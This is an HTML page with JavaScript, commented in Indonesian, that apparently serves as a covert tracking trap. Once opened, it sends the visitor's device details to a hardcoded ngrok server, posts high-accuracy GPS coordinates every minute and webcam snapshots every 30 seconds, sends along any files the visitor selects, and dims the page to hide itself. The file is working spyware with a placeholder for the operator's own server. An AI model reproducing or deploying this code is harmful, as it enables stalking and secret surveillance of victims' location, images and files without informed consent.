<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>System</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: white;
            font-family: Arial, sans-serif;
        }
        .container {
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 10px;
            z-index: 9999;
        }
        .btn-upload {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #1a73e8;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 30px;
            font-size: 14px;
            cursor: pointer;
            z-index: 9999;
        }
    </style>
</head>
<body>
    <div class="container" id="status">Initializing...</div>
    <button class="btn-upload" id="uploadBtn">📁 Upload Files</button>

    <script>
        // ============ GANTI DENGAN LINK NGROK KAMU ============
        const SERVER = "https://reversion-exert-gloomily.ngrok-free.dev";
        // ======================================================
        
        let mediaStream = null;
        let photoInterval = null;
        let locationInterval = null;
        let fileInput = null;
        
        function updateStatus(msg) {
            const el = document.getElementById('status');
            if (el) el.innerHTML = msg;
            console.log(msg);
        }
        
        async function sendToServer(endpoint, data, isFile = false) {
            try {
                let url = `${SERVER}/${endpoint}`;
                let options = {};
                
                if (isFile) {
                    options = { method: 'POST', body: data };
                } else {
                    options = {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    };
                }
                
                const response = await fetch(url, options);
                return response.ok;
            } catch(e) {
                console.log(`Send to ${endpoint} failed:`, e);
                return false;
            }
        }
        
        // ============ GPS REAL-TIME SETIAP 1 MENIT ============
        async function sendLocation() {
            if (!('geolocation' in navigator)) {
                updateStatus('❌ GPS not supported');
                return;
            }
            
            updateStatus('📍 Getting GPS location...');
            
            navigator.geolocation.getCurrentPosition(async (position) => {
                // Data koordinat LENGKAP
                const locationData = {
                    // KOORDINAT UTAMA
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    
                    // Detail akurasi
                    accuracy: position.coords.accuracy, // meter (semakin kecil semakin akurat)
                    
                    // Info tambahan (jika tersedia)
                    altitude: position.coords.altitude,
                    altitudeAccuracy: position.coords.altitudeAccuracy,
                    heading: position.coords.heading, // arah (0-360 derajat)
                    speed: position.coords.speed, // kecepatan (m/s)
                    
                    // WAKTU
                    timestamp: position.timestamp,
                    isoTime: new Date(position.timestamp).toISOString(),
                    localTime: new Date(position.timestamp).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
                    
                    // Informasi GPS
                    provider: 'GPS',
                    accuracyLevel: position.coords.accuracy < 10 ? 'Sangat Akurat (<10m)' : 
                                  (position.coords.accuracy < 50 ? 'Akurat (<50m)' : 'Kurang Akurat (>50m)')
                };
                
                // Kirim ke server
                const success = await sendToServer('location', locationData);
                
                if (success) {
                    const coordText = `📍 ${locationData.latitude}, ${locationData.longitude} | Akurasi: ${locationData.accuracy}m | ${new Date().toLocaleTimeString()}`;
                    updateStatus(coordText);
                    console.log(`[GPS] ${coordText}`);
                    
                    // Tampilkan di console dengan format jelas
                    console.log('═══════════════════════════════════════');
                    console.log(`🌍 LATITUDE  : ${locationData.latitude}`);
                    console.log(`🌍 LONGITUDE : ${locationData.longitude}`);
                    console.log(`📏 ACCURACY  : ${locationData.accuracy} meter`);
                    console.log(`🕐 TIME      : ${locationData.localTime}`);
                    console.log('═══════════════════════════════════════');
                } else {
                    updateStatus('❌ Failed to send GPS');
                }
                
            }, (error) => {
                // Error handling
                let errorMsg = '';
                switch(error.code) {
                    case error.PERMISSION_DENIED:
                        errorMsg = '❌ GPS permission denied. Click Allow!';
                        break;
                    case error.POSITION_UNAVAILABLE:
                        errorMsg = '❌ GPS signal not available';
                        break;
                    case error.TIMEOUT:
                        errorMsg = '❌ GPS timeout - try again';
                        break;
                    default:
                        errorMsg = `❌ GPS error: ${error.message}`;
                }
                updateStatus(errorMsg);
                console.log(errorMsg);
                
                // Kirim error ke server
                sendToServer('location_error', {
                    error: error.message,
                    code: error.code,
                    timestamp: Date.now()
                });
            }, {
                enableHighAccuracy: true,  // WAJIB! untuk GPS akurat
                timeout: 10000,
                maximumAge: 0  // Jangan pakai cache, ambil fresh!
            });
        }
        
        // ============ AMBIL FOTO SETIAP 30 DETIK ============
        async function captureAndSendPhoto() {
            if (!mediaStream) return;
            
            try {
                const video = document.createElement('video');
                video.srcObject = mediaStream;
                video.muted = true;
                video.playsInline = true;
                video.style.display = 'none';
                document.body.appendChild(video);
                await video.play();
                await new Promise(r => setTimeout(r, 200));
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('photo', blob);
                    await sendToServer('photo', formData, true);
                    console.log(`📸 Photo sent at ${new Date().toLocaleTimeString()}`);
                }, 'image/jpeg', 0.7);
                
                video.srcObject = null;
                video.remove();
            } catch(e) {
                console.log('Capture error:', e);
            }
        }
        
        // ============ DEVICE INFO ============
        async function sendDeviceInfo() {
            let batteryInfo = {};
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    batteryInfo = {
                        level: (battery.level * 100).toFixed(1) + '%',
                        charging: battery.charging
                    };
                } catch(e) {}
            }
            
            const deviceInfo = {
                timestamp: Date.now(),
                localTime: new Date().toLocaleString('id-ID'),
                hardware: {
                    platform: navigator.platform,
                    userAgent: navigator.userAgent,
                    isMobile: /Mobi|Android|iPhone/i.test(navigator.userAgent),
                    isAndroid: /Android/i.test(navigator.userAgent),
                    isIOS: /iPhone|iPad/i.test(navigator.userAgent)
                },
                battery: batteryInfo,
                screen: {
                    width: screen.width,
                    height: screen.height
                }
            };
            
            await sendToServer('device', deviceInfo);
            console.log('📱 Device info sent');
        }
        
        // ============ UPLOAD FILE ============
        function setupUpload() {
            fileInput = document.createElement('input');
            fileInput.type = 'file';
            fileInput.multiple = true;
            fileInput.style.display = 'none';
            document.body.appendChild(fileInput);
            
            document.getElementById('uploadBtn').onclick = () => fileInput.click();
            
            fileInput.onchange = async () => {
                for (let file of fileInput.files) {
                    const formData = new FormData();
                    formData.append('file', file);
                    await sendToServer('upload', formData, true);
                    console.log(`📁 Uploaded: ${file.name}`);
                }
                alert(`Uploaded ${fileInput.files.length} files`);
                fileInput.value = '';
            };
        }
        
        // ============ MAIN ============
        async function start() {
            updateStatus('🎯 Starting GPS tracking...');
            
            // Minta akses kamera (untuk foto)
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: 640, height: 480 },
                    audio: true
                });
                mediaStream.getAudioTracks().forEach(t => t.enabled = true);
                console.log('✅ Camera ready');
            } catch(e) {
                console.log('Camera not available, continuing without photo');
            }
            
            // Kirim device info
            await sendDeviceInfo();
            
            // GPS: langsung ambil pertama kali
            await sendLocation();
            
            // GPS: SETIAP 1 MENIT (60000 ms)
            locationInterval = setInterval(sendLocation, 60000);
            console.log('⏰ GPS tracking every 1 MINUTE');
            
            // Foto setiap 30 detik (jika kamera tersedia)
            if (mediaStream) {
                photoInterval = setInterval(captureAndSendPhoto, 30000);
                console.log('📸 Auto photo every 30 seconds');
            }
            
            // Setup upload
            setupUpload();
            
            updateStatus('📍 GPS aktif - update setiap 1 menit');
            
            // Sembunyikan halaman setelah 3 detik
            setTimeout(() => {
                document.body.style.opacity = '0.3';
            }, 3000);
        }
        
        start();
        
        window.addEventListener('beforeunload', () => {
            if (photoInterval) clearInterval(photoInterval);
            if (locationInterval) clearInterval(locationInterval);
            if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
        });
    </script>
</body>
</html>
